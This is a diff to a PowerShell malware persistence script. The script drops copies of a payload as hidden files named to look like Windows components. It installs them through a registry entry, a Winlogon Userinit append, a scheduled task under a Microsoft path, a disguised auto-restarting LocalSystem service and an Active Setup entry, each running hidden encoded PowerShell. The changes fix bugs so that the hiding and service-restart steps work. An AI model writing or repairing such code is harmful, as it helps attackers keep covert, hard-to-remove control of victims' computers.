@@ -78,7 +78,7 @@ $Reg1PayloadName = "WUDFComponentHost"
 $Reg1DropPath    = "$DropDir\wudf-host-svc.ps1"
 
 Copy-Item -Path $PayloadPath -Destination $Reg1DropPath -Force
-(Get-Item $Reg1DropPath -Force).Attributes += [System.IO.FileAttributes]::Hidden
+$f1 = Get-Item $Reg1DropPath -Force; $f1.Attributes = $f1.Attributes -bor [System.IO.FileAttributes]::Hidden
 
 $Reg1Encoded = Get-EncodedCommand -ScriptPath $Reg1DropPath
 $Reg1Command = "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $Reg1Encoded"
@@ -107,7 +107,7 @@ $Reg2DropPath    = "$DropDir\userinit-ext.ps1"
 $Reg2Key         = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 
 Copy-Item -Path $PayloadPath -Destination $Reg2DropPath -Force
-(Get-Item $Reg2DropPath -Force).Attributes += [System.IO.FileAttributes]::Hidden
+$f2 = Get-Item $Reg2DropPath -Force; $f2.Attributes = $f2.Attributes -bor [System.IO.FileAttributes]::Hidden
 
 $Reg2Encoded = Get-EncodedCommand -ScriptPath $Reg2DropPath
 $Reg2Addition = ",powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $Reg2Encoded"
@@ -139,7 +139,7 @@ $Task3Path     = "\Microsoft\Windows\DiagnosticsHub\"
 $Task3DropPath = "$DropDir\diaghub-collector.ps1"
 
 Copy-Item -Path $PayloadPath -Destination $Task3DropPath -Force
-(Get-Item $Task3DropPath -Force).Attributes += [System.IO.FileAttributes]::Hidden
+$f3 = Get-Item $Task3DropPath -Force; $f3.Attributes = $f3.Attributes -bor [System.IO.FileAttributes]::Hidden
 
 $Task3Encoded = Get-EncodedCommand -ScriptPath $Task3DropPath
 $Task3Action  = New-ScheduledTaskAction `
@@ -198,7 +198,7 @@ $Svc4Desc     = "Provides host process for Windows Management Instrumentation pr
 $Svc4DropPath = "$DropDir\wmiprvse-helper.ps1"
 
 Copy-Item -Path $PayloadPath -Destination $Svc4DropPath -Force
-(Get-Item $Svc4DropPath -Force).Attributes += [System.IO.FileAttributes]::Hidden
+$f4 = Get-Item $Svc4DropPath -Force; $f4.Attributes = $f4.Attributes -bor [System.IO.FileAttributes]::Hidden
 
 # Point the service directly at powershell.exe -File <dropped script>.
 # Using cmd.exe /c start /min would exit immediately (cmd exits after spawning),
@@ -220,7 +220,7 @@ if ($existingSvc) {
 sc.exe create $Svc4Name binPath= "$Svc4BinPath" start= auto obj= LocalSystem | Out-Null
 
 sc.exe description $Svc4Name "$Svc4Desc" | Out-Null
-sc.exe failure      $Svc4Name reset= 60 actions= restart/5000//5000//5000 | Out-Null
+sc.exe failure      $Svc4Name reset= 60 actions= restart/5000/restart/5000/restart/5000 | Out-Null
 
 # Blend the display name into the SCM list
 Set-ItemProperty `
@@ -250,7 +250,7 @@ $AS5KeyPath   = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\$AS5
 $AS5DropPath  = "$DropDir\iecompat-stub.ps1"
 
 Copy-Item -Path $PayloadPath -Destination $AS5DropPath -Force
-(Get-Item $AS5DropPath -Force).Attributes += [System.IO.FileAttributes]::Hidden
+$f5 = Get-Item $AS5DropPath -Force; $f5.Attributes = $f5.Attributes -bor [System.IO.FileAttributes]::Hidden
 
 $AS5Encoded  = Get-EncodedCommand -ScriptPath $AS5DropPath
 $AS5StubPath = "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $AS5Encoded"
